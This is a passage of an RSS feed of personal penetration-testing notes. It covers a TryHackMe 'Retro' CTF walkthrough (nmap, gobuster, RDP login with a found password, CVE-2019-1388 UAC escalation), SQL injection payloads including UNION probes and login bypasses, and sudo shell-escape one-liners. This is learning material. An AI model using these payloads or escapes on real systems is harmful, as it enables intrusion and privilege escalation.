&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-p-&lt;/span&gt; 10.10.20.185&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives us:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jan  2 19:34:48 2022 as: nmap -v -oA retro -Pn -A -T4 -sS -script vuln -p- 10.10.20.185
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.20.185
Host is up (0.18s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.013 days (since Sun Jan  2 19:29:09 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   37.05 ms  10.13.0.1
2   ... 3
4   180.52 ms 10.10.20.185

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  2 19:47:21 2022 -- 1 IP address (1 host up) scanned in 753.31 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So we've got IIS and RDP running. Let's start by taking a look around IIS.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/./Blaster.md&quot;&gt;Blaster&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;flag-1-the-hidden-directory&quot;&gt;Flag 1: The Hidden Directory&lt;/h2&gt;&lt;p&gt;As with Blaster, we just have the default IIS welcome page. So let's follow up with gobuster since we know from the flag list that there's a hidden directory&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-t&lt;/span&gt; 10 dir &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; http://10.10.20.185/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Still paralleling Blaster, the hidden directory is &lt;code&gt;/retro&lt;/code&gt;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22gobuster%22.md&quot;&gt;Using &quot;gobuster&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;flag-2-usertxt&quot;&gt;Flag 2: &lt;code&gt;user.txt&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;Visiting &lt;a href=&quot;http://10.10.20.185/retro/&quot;&gt;http://10.10.20.185/retro/&lt;/a&gt; reveals the same retro arcade website as Blaster. (I'm noticing a parallel hereâ¦ I suspect that the rest of the CTF will also be the same, though I'm going to see if I can do this one with less guessing.)&lt;/p&gt;&lt;p&gt;All of the posts are by &quot;Wade&quot;. I hadn't noticed it the first time, but the &quot;Ready Player One&quot; post is actually suggestive that either Wade's username or password is &quot;Parzival&quot;.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;I can't believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it's because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I'll eventually get it down. Either way, I'm really excited to see this movie!&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;The comment immediately afterward seems to confirm this.&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;Leaving myself a note here just in case I forget how to spell it: parzival&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Theoretically I should use this information to generate a wordlist (who knows what permutations Wade is applying to &quot;Parzival&quot;, and whether this is Wade's username or password). There's a few Kali Linux tools that could be used to harvest words from &lt;a href=&quot;http://10.10.20.185/retro/&quot;&gt;http://10.10.20.185/retro/&lt;/a&gt; and generate various common permutations, but all of these will result in quite a long list.&lt;/p&gt;&lt;p&gt;In the real world, this is what I'd probably have to do. But since I kinda already know how this is going to shake out, let's just skip ahead to logging in with XFreeRDP.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xfreerdp&lt;/span&gt; /dynamic-resolution +clipboard /cert:ignore &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         /v:&lt;span class=&quot;ex&quot;&gt;10.10.20.185&lt;/span&gt; /u:Wade /p:parzival&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Unsurprisingly, this works. The &lt;code&gt;user.txt&lt;/code&gt; file on the desktop contains the second flag (which is different than in Blaster!).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Ready_Player_One&quot;&gt;Ready Player One (Wikipedia)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20XFreeRDP.md&quot;&gt;Using XFreeRDP&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;flag-3-roottxt&quot;&gt;Flag 3: &lt;code&gt;root.txt&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;This flag is probably in &lt;code&gt;C:\Users\Administrator\Desktop\root.txt&lt;/code&gt;. But now things are diverging a bitâ¦&lt;/p&gt;&lt;p&gt;Wade has Google Chrome installed in this version of the CTF, and no other files are on the desktop.&lt;/p&gt;&lt;p&gt;But poking around a bit reveals that things aren't too far off Blaster.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;There's an &lt;code&gt;hhupd.exe&lt;/code&gt; executable in the Recycle Bin.&lt;/li&gt;&lt;li&gt;Chrome has a single bookmark for &quot;NVD - CVE-2019-1388&quot;.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Of course, the TryHackMe machine doesn't have internet access, but we can follow this link locally. Moreover, searching for &lt;code&gt;hhupd&lt;/code&gt; reveals that this is a program that can be used to perform the attack; that page helpfully links to a YouTube video demonstrating how to leverage &lt;code&gt;hhupd.exe&lt;/code&gt; in exactly this way.&lt;/p&gt;&lt;p&gt;The attack works somewhat differently on this system than in Blaster (or the demonstration video), however. Instead of opening up an Internet Explorer window outside of the secure desktop, IE is opened up &lt;em&gt;on&lt;/em&gt; the UAC desktop itself, and all interaction needs to take place there (we also get a choice of using IE or Chromeâ¦). Still, overall things work more-or-less as we'd expect, and we can use the resulting elevated command prompt to read &lt;code&gt;C:\Users\Administrator\Desktop\root.txt.txt&lt;/code&gt; (note the extra &lt;code&gt;.txt&lt;/code&gt;) to obtain the final flag.&lt;/p&gt;&lt;p&gt;(I kinda feel like I cheated now, since I did Blaster first without realizing that this room was almost &lt;em&gt;exactly&lt;/em&gt; the same.)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2019-1388&quot;&gt;CVE-2019-1388 Detail (National Vulnerability Database)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.nagenrauft-consulting.com/2019/11/21/cve-2019-1388-hhupd-exe/&quot;&gt;CVE-2019-1388 (nagenrauft-consulting.com)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;related-video&quot;&gt;Related Video&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=3BQKpPNlTSo&quot;&gt;CVE-2019-1388: Windows Privilege Escalation Through UAC (YouTube)&lt;/a&gt;&lt;/p&gt;&lt;p&gt;ELAPSED TIME: 1 h 16 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/retro&quot;&gt;TryHackMe: Retro&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Retro.md</guid>
		</item>
		<item>
			<title>SQL Injection</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/SQL%20Injection.md</link>
			<description>&lt;p&gt;SQL injection is &lt;em&gt;most&lt;/em&gt; common in PHP-based apps (though other languages are also vulnerable).&lt;/p&gt;&lt;p&gt;The canonical SQL injection &quot;test&quot; is to input a single quote and see if that generates an error. Remember, though, that there are &lt;em&gt;three&lt;/em&gt; different kinds of quotes you may need to test!&lt;/p&gt;&lt;p&gt;When injecting code, you'll &lt;em&gt;often&lt;/em&gt; want to end with a trailing &quot;&lt;code&gt;--&lt;/code&gt;&quot; (space-dash-dash-space) in order to &lt;em&gt;comment out&lt;/em&gt; the remainder or the line you're injecting into. Generally &quot;&lt;code&gt; --+&lt;/code&gt;&quot;, &quot;&lt;code&gt; --%20&lt;/code&gt;&quot;, or &quot;&lt;code&gt; -- -&lt;/code&gt;&quot; will be needed in practice to prevent the trailing space from being eaten. On some flavors of SQL, &quot;&lt;code&gt;# &lt;/code&gt;&quot; (and variants of the trailing space) will work too. (And sometimes you don't even need the trailing comment, if the value you're injecting into is at the end of a statementâ¦)&lt;/p&gt;&lt;p&gt;You don't necessarily know &lt;em&gt;how&lt;/em&gt; user inputs are going to be processed on the backend. Sometimes its one query. Sometimes it's multiple queries. This means that you sometimes need to inject SQL into &lt;em&gt;multiple&lt;/em&gt; fields (particularly when trying to subvert a login).&lt;/p&gt;&lt;p&gt;Similarly, sometimes a developer might get &quot;clever&quot; and try to error out on trailing comments. If you suspect that's happening, just add something after the trailing &quot;&lt;code&gt;--&lt;/code&gt;&quot; â it's all a comment, after all!&lt;/p&gt;&lt;p&gt;It's common to also test that login queries only return a single result. So sometimes you need to tack on &lt;code&gt;LIMIT 1&lt;/code&gt; to achieve a login bypass.&lt;/p&gt;&lt;h2 id=&quot;types-of-sqli&quot;&gt;Types of SQLi&lt;/h2&gt;&lt;h3 id=&quot;error-based&quot;&gt;Error-Based&lt;/h3&gt;&lt;p&gt;Error-based SQLi retrieves data from the backend by abusing error messages. This obviously requires that error messages are shown to the end user, and is limited to information gathering.&lt;/p&gt;&lt;h3 id=&quot;boolean-based&quot;&gt;Boolean-Based&lt;/h3&gt;&lt;p&gt;Boolean-based SQLi involves monitoring changes in responses to see if a query has executed or failed. The only reason you'd generally do this is if you're doing SQLi blind (where you don't get any output, or the output you do get isn't strongly coupled with the input query).&lt;/p&gt;&lt;p&gt;Obviously, this requires that either the HTTP response code or payload changes depending on the results of the injectionâ¦ (Some frameworks try to make blind SQLi difficult by using redirects, but it's possible â though a pain â to get around this with Burp Suite).&lt;/p&gt;&lt;p&gt;One way this can be useful more generally is by using something like &lt;code&gt;AND (SELECT COUNT(*) FROM table_name) &amp;gt; 0&lt;/code&gt; to probe for the existence/use of &lt;code&gt;table_name&lt;/code&gt;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Burp%20Suite.md&quot;&gt;Using Burp Suite&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;time-based&quot;&gt;Time-Based&lt;/h3&gt;&lt;p&gt;This is basically boolean-based SQLi, except that we're not even getting back true/false information anymore. However, we can introduce a timing attack by replacing a column with &lt;code&gt;sleep()&lt;/code&gt; (which sleeps the connection for the specified number of seconds). If the query fails we'll get a return immediately, but if it succeeds then we'll experience the programmed pause.&lt;/p&gt;&lt;h3 id=&quot;union-based&quot;&gt;Union-Based&lt;/h3&gt;&lt;p&gt;Union-based SQLi is basically just abusing the SQL UNION keyword.&lt;/p&gt;&lt;p&gt;To determine the number of columns in a table you'll need to use a sequence of UNION clauses until you run into and error.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT NULL -- &lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT NULL, NULL -- &lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT NULL, NULL, NULL -- &lt;/code&gt;&lt;/li&gt;&lt;li&gt;â¦and so on until there's an errorâ¦&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;A similar approach can be used to detect column types.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT 'a', NULL, NULL -- &lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT NULL, 'a', NULL -- &lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;' UNION SELECT NULL, NULL, 'a' -- &lt;/code&gt;&lt;/li&gt;&lt;li&gt;â¦and so onâ¦&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The generalization to other data types is straight-forward.&lt;/p&gt;&lt;p&gt;Useful MySQL keywords:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;database()&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;user()&lt;/code&gt; and &lt;code&gt;current_user()&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;version()&lt;/code&gt; or &lt;code&gt;@@version&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The &lt;code&gt;GROUP_CONCAT()&lt;/code&gt; function can be useful here: It concatenates fields (and arbitrary strings) in a row, and then further groups rows separated by commas (or by a string specified using SEPARATOR). &lt;code&gt;CONCAT()&lt;/code&gt; also works for this (use &lt;code&gt;0x3a&lt;/code&gt; to insert &quot;:&quot; characters as separators).&lt;/p&gt;&lt;p&gt;It's worth checking out the Jurassic Park CTF for an example of how to use union-based SQLi (it's a little hard to summarize).&lt;/p&gt;&lt;h3 id=&quot;authentication-bypasses&quot;&gt;Authentication Bypasses&lt;/h3&gt;&lt;p&gt;The trick here is that most login forms use the backing database for authentication, so all we need to do is return a &quot;true&quot; result - we don't really need to guess anyone's password. Sometimes we don't even need to know a username (though I suspect that in practice this may lead to weird authorization problems).&lt;/p&gt;&lt;h3 id=&quot;out-of-band&quot;&gt;Out-of-Band&lt;/h3&gt;&lt;p&gt;Out-of-band SQLi only works if the application or database makes external calls (preferably to a system we control!) based on the results of a database query (that we can inject into). Thus, there are always two channels - an attack channel and a data channel.&lt;/p&gt;&lt;p&gt;DNS is a popular data channel for out-of-band SQLi attacks.&lt;/p&gt;&lt;h2 id=&quot;defense&quot;&gt;Defense&lt;/h2&gt;&lt;p&gt;There are two main strategies for defending against SQLi:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Get your encoding right. User-generated code that's passed off to SQL needs to be SQL-escaped first. Know what the context is of your data, and escape/unescape appropriately when writing data from one context to another!&lt;/li&gt;&lt;li&gt;User prepared queries (in code) and stored procedures (in the database) to limit the ability of user-generated code to influence the surrounding SQL.&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/SQL%20Injection.md</guid>
		</item>
		<item>
			<title>Send a Command Using OpenSSL</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Send%20a%20Command%20Using%20OpenSSL.md</link>
			<description>&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;va&quot;&gt;$TEXT&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;openssl&lt;/span&gt; s_client &lt;span class=&quot;va&quot;&gt;$HOST&lt;/span&gt;:&lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt; -ign_eof&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;-ign_eof&lt;/code&gt; keeps the s_client open on EOF, which can (does?) get sent after each command. This is necessary if you, say, want to read the connected server's respond to sending it $TEXT.&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Send%20a%20Command%20Using%20OpenSSL.md</guid>
		</item>
		<item>
			<title>Set a Shell in ViM</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Set%20a%20Shell%20in%20ViM.md</link>
			<description>&lt;p&gt;If the user shell is set to something non-standard in /etc/passwd, Vi and ViM may not be able to shell out with &lt;code&gt;:shell&lt;/code&gt; or execute shell commands with &lt;code&gt;!&lt;/code&gt;. This is because these apps are attempting to execute &lt;code&gt;$SHELL&lt;/code&gt; (in the case of &lt;code&gt;:shell&lt;/code&gt;) or &lt;code&gt;$SHELL -c $COMMAND&lt;/code&gt; (in the case of &lt;code&gt;!&lt;/code&gt;).&lt;/p&gt;&lt;p&gt;Fortunately, Vi and ViM can be set to override the default $SHELL using &lt;code&gt;:set shell=/bin/bash&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;(Exotic shells in /etc/passwd can also cause commands executed via ssh to fail for the same reason.)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/52604245/ssh-works-with-my-custom-shell-but-cant-execute-commands-directly-using-ssh&quot;&gt;ssh works with my custom shell but can't execute commands directly using ssh&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Set%20a%20Shell%20in%20ViM.md</guid>
		</item>
		<item>
			<title>Shell Escapes</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Shell%20Escapes.md</link>
			<description>&lt;p&gt;Many common UNIX applications allow you to escape to a shell. This is particularly useful if they can be run with NOPASSWD via sudo.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;awk&lt;/code&gt; - &lt;code&gt;awk 'BEGIN {system(&quot;/bin/sh&quot;)}'&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;find&lt;/code&gt; - &lt;code&gt;find . -exec /bin/sh \; -quit&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;ftp&lt;/code&gt; - &lt;code&gt;!/bin/sh&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;iftop&lt;/code&gt; - &lt;code&gt;!/bin/sh&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;less&lt;/code&gt; - &lt;code&gt;!/bin/sh&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;man&lt;/code&gt; - &lt;code&gt;!/bin/sh&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;more&lt;/code&gt; - &lt;code&gt;!/bin/sh&lt;/code&gt; (may require TERM to be unset)&lt;/li&gt;&lt;li&gt;&lt;code&gt;nano&lt;/code&gt; - ^R^X followed by &lt;code&gt;reset; sh 1&amp;gt;&amp;amp;0 2&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;nmap&lt;/code&gt; - create a file containing &lt;code&gt;os.execute(&quot;/bin/sh&quot;)&lt;/code&gt; and then run &lt;code&gt;nmap --script=$FILE&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;vim&lt;/code&gt; - see &quot;Set a Shell in ViM&quot;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;GTFOBins is your one-stop resource for shell escape information.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBins&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Enumerate%20%22sudo%22%20Access.md&quot;&gt;Enumerate &quot;sudo&quot; Access&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Set%20a%20Shell%20in%20ViM.md&quot;&gt;Set a Shell in ViM&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Shell%20Escapes.md</guid>
		</item>
		<item>
			<title>Symbolic Permissions</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Symbolic%20Permissions.md</link>
			<description>&lt;p&gt;Numeric permissions are sometimes called &lt;em&gt;absolute&lt;/em&gt; permissions, because they exactly specify an object's permissions. Symbolic permissions are a bit more flexible.&lt;/p&gt;&lt;p&gt;Like absolute permissions, symbolic permissions are divided into user (u), group (g), and others (o). &lt;em&gt;Unlike&lt;/em&gt; absolute permissions, not all of these permission sets need to be specified. Sets are separated by commas, and identical sets can be combined (e.g., ug).&lt;/p&gt;&lt;p&gt;This specifier is then followed by an &lt;em&gt;operator&lt;/em&gt; that specifies whether the following permissions should be granted (+), removed (-), or set exactly (=). (Note that when using &quot;find&quot; only &quot;=&quot; makes sense.)&lt;/p&gt;&lt;p&gt;Permissions themselves are given as one or more of the following:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Read - r (4)&lt;/li&gt;&lt;li&gt;Write - w (2)&lt;/li&gt;&lt;li&gt;Execute - x (1)&lt;/li&gt;&lt;li&gt;SUID - s/S (4)&lt;/li&gt;&lt;li&gt;SGID - s/S (2)&lt;/li&gt;&lt;li&gt;Sticky Bit - t (1)&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The SUID/SGID bits are applied to the user or group (respectively) when set symbolically; the sticky bit is applied to the &quot;other&quot; permission set. When set numerically, all three of these values are applied to the &quot;prefix&quot; digit.&lt;/p&gt;&lt;p&gt;Symbolically, the SUID/SGID bits can be represented as either &quot;s&quot; or &quot;S&quot;. The different is whether the user/group &lt;em&gt;also&lt;/em&gt; has execute permissions (&quot;s&quot;), or lacks these permissions themself (&quot;S&quot;).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.redhat.com/sysadmin/manage-permissions&quot;&gt;How to manage Linux permissions for users, groups, and others&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.redhat.com/sysadmin/suid-sgid-sticky-bit&quot;&gt;Linux permissions: SUID, SGID, and sticky bit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./How%20to%20Use%20%22find%22%20With%20File%20Metadata.md&quot;&gt;How to Use &quot;find&quot; With File Metadata&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;suid&quot;&gt;SUID&lt;/h2&gt;&lt;p&gt;Execute as the file owner, rather than the user passing the command.&lt;/p&gt;&lt;h2 id=&quot;sgid&quot;&gt;SGID&lt;/h2&gt;&lt;p&gt;If set on a file, this operates similarly to SUID: The file is executed as if the user passing the command was in the &lt;em&gt;group&lt;/em&gt; with the SGID bit set. (I honestly have rarely seen this used.)&lt;/p&gt;&lt;p&gt;If set on a directory, files created in the directory will have their group ownership set to the same group as the directory itself. (In my experience this is the more common use case.)&lt;/p&gt;&lt;h2 id=&quot;sticky-bit&quot;&gt;Sticky Bit&lt;/h2&gt;&lt;p&gt;&lt;em&gt;Only&lt;/em&gt; applied to directories. A file in a directory with the sticky bit set can only be deleted by its owner (and root). For example, /tmp always has the sticky bit set.&lt;/p&gt;&lt;h2 id=&quot;write-permissions-and-directories&quot;&gt;Write Permissions and Directories&lt;/h2&gt;&lt;p&gt;If a user has &lt;em&gt;write&lt;/em&gt; access to a directory, then they can write to any file they have at least &lt;em&gt;read&lt;/em&gt; access to (!!!).&lt;/p&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Symbolic%20Permissions.md</guid>
		</item>
		<item>
			<title>TCP Model</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/TCP%20Model.md</link>
			<description>&lt;h2 id=&quot;tcp-model-layers&quot;&gt;TCP Model Layers&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;Layer 4: Application (highest)&lt;/li&gt;&lt;li&gt;Layer 3: Transport&lt;/li&gt;&lt;li&gt;Layer 2: Internet&lt;/li&gt;&lt;li&gt;Layer 1: Network interface (lowest)&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;osi-vs-tcp-models&quot;&gt;OSI vs. TCP Models&lt;/h2&gt;&lt;p&gt;&lt;em&gt;Roughly&lt;/em&gt;, the TCP Model encapsulates the OSI Model.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;+--------------+-------------------+
| OSI LAYER    | TCP/IP LAYER      |
+--------------+-------------------+
| Application  |                   |
+--------------+                   |
| Presentation | Application       |
+--------------+                   |
| Session      |                   |
+--------------+-------------------+
| Transport    | Transport         |
+--------------+-------------------+
| Network      | Internet          |
+--------------+-------------------+
| Data Link    |                   |
+--------------+ Network Interface |
| Physical     |                   |
+--------------+-------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/presecurity&quot;&gt;TryHackMe: Pre Security&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./OSI%20Model.md&quot;&gt;OSI Model&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/TCP%20Model.md</guid>
		</item>
		<item>
			<title>TCP Protocol</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/TCP%20Protocol.md</link>
